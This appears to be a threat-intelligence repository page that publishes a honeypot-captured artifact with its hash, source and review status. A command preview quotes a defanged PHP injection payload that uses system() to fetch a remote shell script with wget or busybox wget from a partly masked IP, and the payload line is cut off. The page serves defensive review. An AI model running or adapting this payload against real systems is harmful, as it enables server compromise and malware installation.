# 5b4c25be5c1c30c0db980e8825a9965c44b5741629361d4dfd269a5360134ac1

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `5b4c25be5c1c30c0db980e8825a9965c44b5741629361d4dfd269a5360134ac1` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
<?php system('(wget -qO- hxxp://45[.]153[.]34[.]XXX/rondo.``dtm.sh||busybox wget -qO- hxxp://45[.]153[.]34[.]XXX/rondo.``dtm.sh||cur
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
